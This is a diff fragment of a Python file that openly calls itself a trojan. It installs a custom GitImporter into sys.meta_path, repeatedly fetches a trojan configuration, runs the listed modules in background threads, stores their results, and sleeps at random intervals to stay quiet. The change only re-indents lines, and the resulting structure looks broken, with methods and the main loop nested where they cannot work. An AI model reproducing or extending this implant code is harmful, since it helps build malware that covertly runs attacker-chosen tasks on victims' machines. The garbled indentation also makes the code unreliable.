@@ -57,9 +57,9 @@ def store_module_result(data):
     return
 
 
-    class GitImporter(object):
-        def __init__(self):
-            self.current_module_code = ""
+class GitImporter(object):
+    def __init__(self):
+        self.current_module_code = ""
 
         def find_module(self, fullname, path=None):
             if configured:
@@ -83,12 +83,12 @@ def store_module_result(data):
             store_module_result(result)
             return
 
-    sys.meta_path = [GitImporter()]
-    while True:
-        if task_queue.empty():
-            config = get_trojan_config()
-            for task in config:
-                t = threading.Thread(target=module_runner, args=(task['module'],))
-                t.start()
-                time.sleep(random.randint(1, 10))
-        time.sleep(random.randint(1000, 10000))
+        sys.meta_path = [GitImporter()]
+        while True:
+            if task_queue.empty():
+                config = get_trojan_config()
+                for task in config:
+                    t = threading.Thread(target=module_runner, args=(task['module'],))
+                    t.start()
+                    time.sleep(random.randint(1, 10))
+            time.sleep(random.randint(1000, 10000))
